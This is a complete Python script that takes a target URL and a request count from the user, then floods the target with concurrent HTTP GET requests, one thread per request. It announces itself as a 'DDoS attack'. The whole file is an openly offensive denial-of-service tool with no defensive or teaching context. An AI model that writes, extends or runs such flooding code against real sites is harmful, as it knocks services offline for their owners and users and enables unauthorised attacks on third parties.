import requests
import threading

def send_request(url):
    try:
        response = requests.get(url)
        print(f"Request sent, response code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def flood_target(url, num_requests):
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    print("Completed sending requests.")

def main():
    target_url = input("Enter the target URL: ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    try:
        num_requests = int(input("Enter the number of requests to send (default: 1000): ") or 1000)
    except ValueError:
        print("Invalid number entered. Using default value of 1000.")
        num_requests = 1000

    print(f"Starting DDoS attack on {target_url} with {num_requests} requests.")
    flood_target(target_url, num_requests)

if __name__ == "__main__":
    main()
